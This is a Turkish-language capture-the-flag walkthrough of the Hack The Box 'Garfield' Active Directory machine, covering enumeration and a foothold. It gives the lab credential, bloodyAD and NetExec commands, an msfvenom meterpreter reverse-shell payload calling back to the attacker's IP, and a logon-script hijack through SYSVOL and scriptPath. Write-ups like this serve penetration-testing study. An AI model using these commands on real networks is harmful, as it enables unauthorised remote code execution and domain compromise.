HTB GARFIELD | FULL ATTACK CHAIN WALKTHROUGH 

ZORLUK: HIGH | OS: WINDOWS | KATEGORI: ACTİVE DİRECTORY

GENEL BAKIŞ;
*Garfield RODC(Read-Only Domain Controller) güvenlik modelini nasıl kötüye kullanılabileceğini gösteren çok katmanlı bir Active Directory saldırı zinciri barındırıyor.
*logon script hijack --> ACL zinciri üzerinden yatay hareket --> RODC grup üyeliği kötüye kullanımı --> Password Replication Policy manipülasyonu --> RODC Golden Ticket ile Administrator NT hash sızdırma.

MAKCHINE INFO: j.arbuckle / Th1sD4mnC4t!@1978

SALDIRI YOLU;

*LDAP/SMB Enumerasyonu(RODC'ye özel krbtgt_8245 hesabı)

* ACL kötüye kullanım(scriptPath yazma izni)

* Parola Sıfırlama Hakkı --> l.wilson --> l.wilson_adm(RODC Administrators grup üyesi)

* Pivoting(Ligolo-ng) --> 192.168.100.0/24 ağına erişim (RODC01)

* msDS-RevealOnDemandGroup Manipülasyonu

* RODC krbtgt Dump(mimikatz)

* RODC Golden Ticket(Rubeus)

* Pass-the-Hash --> root 



Recon (keşif)
1- Host ayakta mı ? 

ping -c 4 10.129.244.207
ping komutu ile hedefin ayakta olup olmadığını doğruluyoruz



2- Nmap Port/Service/Os/Script taraması

nmap -A -Pn 10.129.244.207
sonuçlar klasik bir Active Directory profilini gösteriyor:
53 -> DNS 
88 -> kerberos
135/139/445 -> RPC/NetBIOS/SMB
389/3268 -> LDAP --> Domain: garfield.htb
464 -> kpasswd5 --> kerberos password change
593 -> ncacn_http --> RPC over HTTP
2179 -> vmrdp 
3389 -> ms-wbt-server --> RDP, sertifikadan DC01.garfield.htb doğrulandı
5985 -> WinRM


3- /etc/hosts kaydı

echo "10.129.244.207 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts



4- LDAP Kullanıcı Enumerasyonu 

nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
Elimizde zaten geçerli bir kimlik bilgisi var: j.arbuckle : Th1sD4mnC4t!@1978 . Bununla nxc(NetExec) üzerinden LDAP'a bağlanıp domain kullanıcıları listeliyoruz. 
7 tane domain kullanıcısı listelendi. Dikkat çeken nokta krbtgt_8245 kullanıcısı çünkü normal bbir domain'de tek bir krbtgt bulunması gerekir. İkinci bir krbtgt hesabı ortamda bir RODC olduğunun bir işaretidir



5- SMB Enumerasyonu ve ACL Keşfi 

nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
Elimizdeki j.arbuckle kimlik bilgisiyle SMB paylaşımlarını tarıyoruz hangi share'lere erişebildiğimizi ve içeride neler olduğunu görmek içim
5 share tespit edildi, 3^ü okunablir (IPCS, NETLOGON, SYSVOL) SYSVOL ve NETLOGON dikkat çekici çünkü bunlar logon script'lerin ve GPO dosyalarının tutulduğu paylaşımlar.


6- bloodyAD ile Writable Keşfi 

bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail
j.arbuckle hesabının domain genelinde hangi AD nesnelerinde yazma hakkı olduğunu kontrol ediyoruz.
Jon Arbuckle üzerinde yazma hakkı olduğunu görüyrouz.



Foothold-Logon Script Hijack
7- msfvenom | Payload hazırlama 

tun0 üzerindeki VPN IP'im --> 10.10.17.90
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.90 LPORT=443 -f psh-cmd | tail -n 1 > gar2.txt
printf '@echo off\r\n%s\r\n' "$(cat gar2.txt)" > garr2.bat
-f psh-cmd formatı doğrudan bir PowerShell komutu(bse64 encoded) olarak üretir. bunu bir .bat dosyasına ekleyerek(@echo off + PowerShell) komutu, scriptPath mekanizmasının çalıştırabileceği bir dosya elde ediyoruz.




9- Bat Dosyasını SYSVOL'e Yükleme ve scriptPath Ayarlama 

smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put garr2.bat garr2.bat'
garr2.bat dosyası SYSVOL\garfield.htb\scripts\ altına yüklendi.

bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v garr2.bat
l.wilson Kullanıcısının scriptPath özelliği garr2.bat olarak ayarlandı.






Foothold - Meterpreter Session ve İlk Erişim 
10- Metasploit Handler Kurulumu 

msfconsole -q 
use multi/handler 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.17.90
set LPORT 443
run 
Logon Script Hijack başarılı - l.wilson kullanıcı bağlamında kod çalıştırma elde ettik.












